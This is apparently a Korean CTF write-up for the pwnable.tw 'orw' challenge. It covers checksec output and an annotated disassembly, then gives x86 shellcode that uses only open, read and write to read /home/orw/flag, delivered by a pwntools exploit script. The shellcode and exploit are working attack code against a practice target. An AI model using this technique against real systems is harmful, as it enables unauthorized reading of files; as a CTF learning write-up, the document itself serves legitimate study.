# orw

Read the flag from `/home/orw/flag`.

Only `open` `read` `write` syscall are allowed to use.

`nc chall.pwnable.tw 10001`

[orw](https://pwnable.tw/static/chall/orw)

---

```
$ file orw
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```

32비트 ELF 실행파일로 라이브러리는 `/lib/ld-linux.so.2`를 사용하고 디버깅 정보가 그대로 붙어 있다.

```
pwndbg> checksec
[*] '/home/jhyun/Desktop/Hacking/pwnable.tw/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

카나리가 걸려있다. 함수는 `main`과 `orw_seccomp` 함수가 있다.

```
pwndbg> disass main
Dump of assembler code for function main:
   0x08048548 <+0>:	lea    ecx,[esp+0x4]
   0x0804854c <+4>:	and    esp,0xfffffff0
   0x0804854f <+7>:	push   DWORD PTR [ecx-0x4]
        카나리 설정
   0x08048552 <+10>:	push   ebp
   0x08048553 <+11>:	mov    ebp,esp
        함수 프롤로그
   0x08048555 <+13>:	push   ecx
   0x08048556 <+14>:	sub    esp,0x4
   0x08048559 <+17>:	call   0x80484cb <orw_seccomp>
        orw_seccomp 함수에서 secure computing 관련 함수로 시스템 콜을 제한함
   0x0804855e <+22>:	sub    esp,0xc
   0x08048561 <+25>:	push   0x80486a0
   0x08048566 <+30>:	call   0x8048380 <printf@plt>
   0x0804856b <+35>:	add    esp,0x10
        printf("Give my your shellcode:");
   0x0804856e <+38>:	sub    esp,0x4
   0x08048571 <+41>:	push   0xc8
   0x08048576 <+46>:	push   0x804a060
   0x0804857b <+51>:	push   0x0
   0x0804857d <+53>:	call   0x8048370 <read@plt>
   0x08048582 <+58>:	add    esp,0x10
        read(0, 0x804a060, 0xC8);
   0x08048585 <+61>:	mov    eax,0x804a060
   0x0804858a <+66>:	call   eax
        0x804a060();
   0x0804858c <+68>:	mov    eax,0x0
   0x08048591 <+73>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:	leave  
   0x08048595 <+77>:	lea    esp,[ecx-0x4]
        카나리 체크
   0x08048598 <+80>:	ret    
End of assembler dump.
```

`main` 함수를 놓고 보면 위와 같다.

별 다른 생각 없이 `open` `read` `write` 시스템 콜로 `/home/orw/flag`만 가져오면 될 것 같다.

1. a = open("/home/orw/flag", O_RDONLY)
2. read(a, 0x804a060, 0x30)
3. write(1, 0x804a060, 0x30)

귀찮아서 인터넷에서 [온라인 어셈블러](https://defuse.ca/online-x86-assembler.htm) 검색해서 string literal을 가져왔다.

어셈블리 코드는 생각보다 간단하다.

```
push 0x6761
push 0x6C662F77
push 0x726F2F65
push 0x6D6F682F
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov eax, 0x5
int 0x80
mov ebx, eax
mov ecx, 0x804a060
mov edx, 0x30
mov eax, 0x3
int 0x80
mov ebx, 0x0
mov ecx, 0x804a060
mov edx, 0x30
mov eax, 0x4
int 0x80
xor eax, eax
add eax, 1
int 0x80
```

이렇게 돌려서 나온 string literal을 입력하면 된다.

```python
from pwn import *

r = remote('chall.pwnable.tw', 10001)
# r = process("/home/jhyun/Desktop/Hacking/pwnable.tw/orw")
# context.log_level='debug'
# gdb.attach(r, 'b* 0x08048582')

print r.recv()

payload = "\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xD2\xB8\x05\x00\x00\x00\xCD\x80\x89\xC3\xB9\x60\xA0\x04\x08\xBA\x30\x00\x00\x00\xB8\x03\x00\x00\x00\xCD\x80\xBB\x00\x00\x00\x00\xB9\x60\xA0\x04\x08\xBA\x30\x00\x00\x00\xB8\x04\x00\x00\x00\xCD\x80\x31\xC0\x83\xC0\x01\xCD\x80"

r.send(payload)

print r.recv()
```